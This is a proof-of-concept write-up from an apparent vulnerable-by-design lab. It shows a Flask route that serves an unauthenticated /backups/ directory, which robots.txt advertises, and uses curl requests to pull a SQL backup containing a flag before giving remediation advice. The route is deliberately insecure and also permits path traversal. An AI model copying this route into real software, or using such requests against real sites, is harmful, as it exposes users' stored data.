# PoC 6 — Sensitive Data Exposure (`/backups/`)

**Flag:** `FLAG{exposure_9aa8fce5da07}`

## Vulnerability

A backup directory is served directly by the app with no access control,
and is only "hidden" by convention via `robots.txt` — which, ironically,
advertises its existence to anyone who reads it:

```python
@app.route("/robots.txt")
def robots():
    return Response("User-agent: *\nDisallow: /backups/\n", mimetype="text/plain")

@app.route("/backups/<path:name>")
def backups(name):
    # VULN (exposure): a sensitive backup dir is served directly.
    path = os.path.join(APP_DIR, "backups", name)
    with open(path, "r") as fh:
        data = fh.read()
    return Response(data, mimetype="text/plain")
```

`robots.txt` is a convention respected by well-behaved crawlers, not an
access control — the route backing `/backups/` has no authentication or
authorization check at all.

## Exploit

Standard recon step — checking `robots.txt` before anything else:

```bash
curl -s http://127.0.0.1:5000/robots.txt
```

**Response:**

```
User-agent: *
Disallow: /backups/
```

This discloses a path the operators explicitly did not want crawled —
a strong signal something sensitive lives there. Requesting the known
backup filename directly:

```bash
curl -s http://127.0.0.1:5000/backups/vulnhub.sql.bak
```

**Response body:**

```
-- database backup (should NOT be world-readable)
-- left in /backups/ by mistake
INSERT INTO secrets VALUES ('FLAG{exposure_9aa8fce5da07}');
```

A raw SQL dump of the `secrets` table is served to an unauthenticated
request.

## Remediation

Never store backups inside a web-served directory. If backups must live
on the same host, keep them outside the app's static/served root
entirely, and require authentication for any endpoint that must serve
operational data. `robots.txt` should never be relied on to protect
anything — it is advisory for crawlers, not an access control mechanism.

**Severity:** High — unauthenticated disclosure of a database backup
containing secrets.
